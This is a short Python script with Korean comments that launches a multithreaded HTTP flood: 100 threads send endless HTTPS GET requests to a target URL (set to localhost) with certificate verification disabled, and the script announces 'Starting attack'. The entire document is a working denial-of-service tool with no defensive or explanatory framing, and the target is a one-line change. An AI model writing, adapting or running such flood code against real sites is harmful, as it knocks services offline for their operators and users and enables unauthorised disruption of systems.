
import requests
import threading
import sys

# 공격 대상 설정
target_url = "https://127.0.0.1/" # 대상 URL
threads_count = 100 # 스레드 수 (트래픽 양 조절)

def send_requests():
    while True:
        try:
            # HTTPS GET 요청
            response = requests.get(target_url, verify=False) # verify=False는 SSL 인증서 검증 무시
            print(f"Request sent: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# 다중 스레드 실행
print(f"Starting attack on {target_url} with {threads_count} threads...")
for i in range(threads_count):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True # 메인 프로그램 종료 시 스레드도 종료
    thread.start()

# 메인 스레드가 종료되지 않도록 유지
while True:
    pass
